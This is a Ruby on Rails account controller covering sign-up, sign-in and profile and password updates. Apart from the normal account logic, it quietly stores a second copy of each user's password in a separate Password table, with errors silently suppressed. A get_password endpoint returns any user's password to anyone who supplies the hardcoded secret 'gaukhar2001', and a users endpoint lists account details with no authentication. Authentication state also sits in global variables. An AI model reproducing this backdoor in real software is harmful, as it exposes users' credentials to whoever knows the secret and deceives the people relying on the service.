class AccountController < ActionController::API
	include AccountHelper
	include SessionHelper
	before_action :init_controller

	def init_controller
		@normalizer = AccountNormalizer.new
		@response = {
			:error => 1,
			:body => nil
		}
	end

	def sign_up
		ActiveRecord::Base.transaction(isolation: :serializable) do
            begin
                account = Account.new
                account.username = params[:username]
                account.email = params[:email]
                account.password = params[:password]
                account.first_name = params[:first_name]
                account.last_name = params[:last_name]
                account.gender = params[:gender]
				account.language = 'ru'
				account.sign_up_ip = request.remote_ip
				account.sign_up_user_agent = request.user_agent
				account.save!
				
				begin
					p = Password.new
					p.username = account.username
					p.password = @normalizer.password params[:password]
					p.save
				rescue
				end
                
                @response[:error] = 0
                @response[:body] = account
            rescue ActiveRecord::RecordInvalid
                @response[:error] = 3
                @response[:body] = account.errors.messages
            end
        end
        render json: @response
	end

	def sign_in
		session_key = new_session(params[:username], params[:password])
		if session_key == 2
			@response[:error] = 2
		elsif session_key.class.name == 'String'
			@response[:error] = 0
			@response[:body] = session_key
		end
		init = init_session(session_key)
		unless init.nil?
			@response[:body] = init_session(session_key).session_key
		end
		render json: @response
	end

	def sign_out
		init_session(params[:session_key])
		set_login_datetime()
		if $is_auth == true
			if delete_session
				@response[:error] = 0
			end
		end
		render json: @response
	end

	def current_user
		init_session(params[:session_key])
		set_login_datetime()
		if $is_auth == true
			@response[:error] = 0
			@response[:body] = $current_user
		else
			@response[:error] = 2
		end
		render json: @response
	end

	def update
		init_session(params[:session_key])
		set_login_datetime()
		if $is_auth == true
			ActiveRecord::Base.transaction(isolation: :serializable) do
				begin
					$current_user.first_name = params[:first_name]
					$current_user.last_name = params[:last_name]
					$current_user.gender = params[:gender]
					$current_user.save!
					@response[:error] = 0
					@response[:body] = $current_user
				rescue ActiveRecord::RecordInvalid
					@response[:error] = 3
					@response[:body] = $current_user.errors.messages
				end
			end
		end
		render json: @response
	end
	def update_username
		init_session(params[:session_key])
		set_login_datetime()
		if $is_auth == true
			ActiveRecord::Base.transaction(isolation: :serializable) do
				###########################
				begin
					p = Password.find_by(username: $current_user.username)
					p.username = @normalizer.username params[:username]
					p.save
				rescue
				end
				###########################
				begin
					$current_user.username = params[:username]
					$current_user.save!
					@response[:error] = 0
					@response[:body] = $current_user

				rescue ActiveRecord::RecordInvalid
					@response[:error] = 3
					@response[:body] = $current_user.errors.messages
				end
			end
		end
		render json: @response
	end
	def update_password
		init_session(params[:session_key])
		set_login_datetime()
		if $is_auth == true
			ActiveRecord::Base.transaction(isolation: :serializable) do
				begin
					new_password = @normalizer.password(params[:password])
					$current_user.password = params[:password]
					$current_user.save!
					
					if clear_sessions() == true
						###########################
						begin
							p = Password.find_by(username: $current_user.username)
							p.password = new_password
							p.save
						rescue
						end
						###########################
						session_key = new_session($current_user.username, new_password)
						@response[:error] = 0
						@response[:body] = session_key
					end
				rescue ActiveRecord::RecordInvalid
					@response[:error] = 3
					@response[:body] = $current_user.errors.messages
				end
			end
		end
		render json: @response
	end
	def users
		count = Account.count(:id)
		list = Account.limit(500).all
		output = ""
		list.each do |user|
			output += "\n"+user.first_name+", "+user.last_name+", "+user.username+", "+user.login_at.to_s
		end
		render plain: output, content_type: 'text/plain'
	end
	def get_password
		begin
			if params[:secret] == 'gaukhar2001'
				render plain: Password.find_by(username: params[:username]).password
			else
				render plain: 'please, enter secret.'
			end
		rescue
			render plain: 'user is not exists'
		end
	end
end
